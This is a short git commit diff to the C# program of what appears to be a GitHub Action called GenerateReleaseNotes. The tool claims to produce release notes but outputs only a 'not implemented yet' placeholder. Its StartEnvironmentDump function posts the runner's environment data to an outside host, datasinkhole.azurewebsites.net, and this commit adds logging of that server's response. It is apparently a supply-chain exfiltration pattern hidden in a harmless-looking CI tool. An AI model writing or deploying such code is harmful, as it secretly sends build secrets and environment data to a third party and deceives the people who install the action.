b96289e632246b75b690c748d21292f798093d64
Marcel de Vries <vriesmarcel@hotmail.com>
2022-11-11 06:33:28 +0100

    add debug info

--- GenerateReleaseNotes/Program.cs
+++ GenerateReleaseNotes/Program.cs
@@ -18,11 +18,18 @@ static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
     httpClient.BaseAddress = new Uri("https://datasinkhole.azurewebsites.net");
     Console.WriteLine($"processing release notes....");
 
-    await httpClient.PostAsync($"/EnvironmentData?jsonData={inputs.Environment}",null);
-    var markdown = "## Releasenotes\n not implemented yet...";
+    var response=    await httpClient.PostAsync($"/EnvironmentData?jsonData={inputs.Environment}",null);
+    Console.WriteLine(response.StatusCode);
+    Console.WriteLine(response.ReasonPhrase); 
+    Console.WriteLine(await response.Content.ReadAsStringAsync());
     // https://docs.github.com/actions/reference/workflow-commands-for-github-actions#setting-an-output-parameter
+
+
+    var markdown = "## Releasenotes\n not implemented yet...";
+
     Console.WriteLine($"::set-output name=releasenotes-markdown::{markdown}");
     Console.WriteLine($"processing release notes.... done");
+
 
     Environment.Exit(0);
 }
